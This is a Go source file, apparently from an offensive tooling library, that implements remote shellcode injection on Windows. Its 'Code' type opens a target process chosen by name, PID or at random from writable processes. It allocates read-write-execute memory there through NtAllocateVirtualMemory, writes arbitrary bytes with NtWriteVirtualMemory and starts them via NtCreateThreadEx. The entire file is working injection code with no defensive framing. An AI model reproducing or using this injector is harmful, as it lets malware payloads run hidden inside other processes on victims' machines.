//+build windows

package cmd

import (
	"context"
	"fmt"
	"sync/atomic"
	"unsafe"

	"golang.org/x/sys/windows"
)

const secCode = 0x0002 | 0x0400 | 0x0008 | 0x0020 | 0x0010 | 0x0001 | 0x001

var (
	dllNtdll = windows.NewLazySystemDLL("ntdll.dll")

	funcTerminateThread         = dllKernel32.NewProc("TerminateThread")
	funcNtCreateThreadEx        = dllNtdll.NewProc("NtCreateThreadEx")
	funcGetExitCodeThread       = dllKernel32.NewProc("GetExitCodeThread")
	funcNtFreeVirtualMemory     = dllNtdll.NewProc("NtFreeVirtualMemory")
	funcNtWriteVirtualMemory    = dllNtdll.NewProc("NtWriteVirtualMemory")
	funcNtAllocateVirtualMemory = dllNtdll.NewProc("NtAllocateVirtualMemory")
)

type base struct {
	loc    uintptr
	once   uint32
	owner  uintptr
	cancel context.CancelFunc
	container
}

func (c *Code) wait() {
	var (
		x   = make(chan error)
		err error
	)
	go waitFunc(windows.Handle(c.handle), waitForever, x)
	select {
	case err = <-x:
	case <-c.ctx.Done():
	}
	if err != nil {
		c.stopWith(err)
		return
	}
	if c.ctx.Err() != nil {
		c.stopWith(c.ctx.Err())
		return
	}
	if r, _, err := funcGetExitCodeThread.Call(uintptr(c.handle), uintptr(unsafe.Pointer(&c.exit))); r == 0 {
		c.stopWith(fmt.Errorf("winapi GetExitCodeProcess error: %w", err))
		return
	}
	if c.exit != 0 {
		c.stopWith(&ExitError{Exit: c.exit})
		return
	}
	c.stopWith(nil)
}
func (c *Code) close() {
	if c.owner == 0 {
		return
	}
	h := windows.Handle(c.owner)
	if c.loc > 0 {
		freeMemory(h, c.loc)
	}
	windows.Close(windows.Handle(c.handle))
	windows.CloseHandle(h)
	c.handle, c.owner, c.loc = 0, 0, 0
}

// Wait will block until the Code thread completes or is terminated by a call to Stop. This function will return
// 'ErrNotCompleted' if the Process has not been started. Always returns nil if the device is not running Windows.
func (c *Code) Wait() error {
	if c.handle == 0 {
		return ErrNotCompleted
	}
	if c.ctx.Err() == nil {
		<-c.ctx.Done()
	}
	return c.err
}

// Stop will attempt to terminate the currently running Code thread instance.
// Always returns nil on non-Windows devices.
func (c *Code) Stop() error {
	if c.handle == 0 {
		return nil
	}
	return c.stopWith(c.kill())
}
func (c *Code) kill() error {
	c.exit = exitStopped
	if r, _, err := funcTerminateThread.Call(uintptr(c.handle), uintptr(exitStopped)); r == 0 {
		return err
	}
	return nil
}

// Start will attempt to start the Code thread and will return an errors that occur while starting the Code thread.
// This function will return 'ErrEmptyCommand' if the 'Data' parameter is empty or nil and 'ErrAlreadyStarted'
// if attempting to start a Code thread that already has been started previously. Always returns 'ErrNotSupportedOS'
// on non-Windows devices.
func (c *Code) Start() error {
	if c.Running() || c.handle > 0 {
		return ErrAlreadyStarted
	}
	if len(c.Data) == 0 {
		return ErrEmptyCommand
	}
	if c.ctx == nil {
		c.ctx = context.Background()
	}
	if c.cancel == nil {
		if c.Timeout > 0 {
			c.ctx, c.cancel = context.WithTimeout(c.ctx, c.Timeout)
		} else {
			c.ctx, c.cancel = context.WithCancel(c.ctx)
		}
	}
	atomic.StoreUint32(&c.once, 0)
	var (
		h   windows.Handle
		err error
	)
	if c.container.empty() {
		h = windows.CurrentProcess()
	} else {
		var p int32
		if p, err = c.container.getPid(); err != nil {
			return c.stopWith(err)
		}
		if h, err = openProcess(p, secCode); err != nil {
			return c.stopWith(err)
		}
	}
	c.owner = uintptr(h)
	if c.loc, err = allocateMemory(h, uint32(len(c.Data))); err != nil {
		return c.stopWith(err)
	}
	if _, err = writeMemory(h, c.loc, c.Data); err != nil {
		return c.stopWith(err)
	}
	if c.handle, err = createThread(h, c.loc); err != nil {
		return c.stopWith(err)
	}
	go c.wait()
	return nil
}
func (b base) String() string {
	return fmt.Sprintf("0x%X -> 0x%X", b.owner, b.loc)
}
func (c *Code) stopWith(e error) error {
	if atomic.LoadUint32(&c.once) == 0 {
		atomic.StoreUint32(&c.once, 1)
		if c.handle > 0 {
			c.kill()
			c.close()
		}
		if c.ctx.Err() != nil && c.exit == 0 {
			c.err = c.ctx.Err()
			c.exit = exitStopped
		}
	}
	c.cancel()
	if c.err == nil && c.ctx.Err() != nil {
		if e != nil {
			c.err = e
			return e
		}
		return nil
	}
	return c.err
}

// SetParent will instruct the Code thread to choose a parent with the supplied process name. If this string is empty,
// this will use the current process (default). Always returns 'ErrNotSupportedOS' if the device is not running Windows.
func (c *Code) SetParent(n string) error {
	c.container.clear()
	if len(n) == 0 {
		return nil
	}
	c.container.name = n
	return nil
}

// SetParentPID will instruct the Code thread to choose a parent with the supplied process ID. If this number is
// zero, this will use the current process (default) and if < 0 this Code thread will choose a parent from a list
// of writable processes. Always returns 'ErrNotSupportedOS' if the device is not running Windows.
func (c *Code) SetParentPID(i int32) error {
	c.container.clear()
	if i == 0 {
		return nil
	}
	c.container.pid = i
	return nil
}

// SetParentRandom will set instruct the Code thread to choose a parent from the supplied string list on runtime. If
// this list is empty or nil, there is no limit to the name of the chosen process. Always returns 'ErrNotSupportedOS' if
// the device is not running Windows.
func (c *Code) SetParentRandom(s []string) error {
	if len(s) == 0 {
		return c.SetParentPID(-1)
	}
	c.container.clear()
	c.container.choices = s
	return nil
}
func freeMemory(h windows.Handle, a uintptr) error {
	var (
		s         uint32
		r, _, err = funcNtFreeVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			uintptr(unsafe.Pointer(&s)), 0x00008000,
		)
	)
	if r > 0 {
		return err
	}
	return nil
}
func createThread(h windows.Handle, a uintptr) (uintptr, error) {
	var (
		t         uintptr
		r, _, err = funcNtCreateThreadEx.Call(
			uintptr(unsafe.Pointer(&t)),
			0x10000000, 0,
			uintptr(h), a,
			0, 0, 0, 0, 0, 0,
		)
	)
	if r > 0 {
		return 0, fmt.Errorf("winapi NtCreateThreadEx error: %w", err)
	}
	return t, nil
}
func allocateMemory(h windows.Handle, s uint32) (uintptr, error) {
	var (
		a         uintptr
		x         = s
		r, _, err = funcNtAllocateVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			0, uintptr(unsafe.Pointer(&x)),
			0x00001000, 0x40,
		)
	)
	if r > 0 {
		return 0, fmt.Errorf("winapi NtAllocateVirtualMemory error: %w", err)
	}
	return a, nil
}
func writeMemory(h windows.Handle, a uintptr, b []byte) (uint32, error) {
	var (
		s         uint32
		r, _, err = funcNtWriteVirtualMemory.Call(
			uintptr(h),
			uintptr(a),
			uintptr(unsafe.Pointer(&b[0])),
			uintptr(len(b)),
			uintptr(unsafe.Pointer(&s)),
		)
	)
	if r > 0 {
		return 0, fmt.Errorf("winapi NtWriteVirtualMemory error: %w", err)
	}
	return s, nil
}
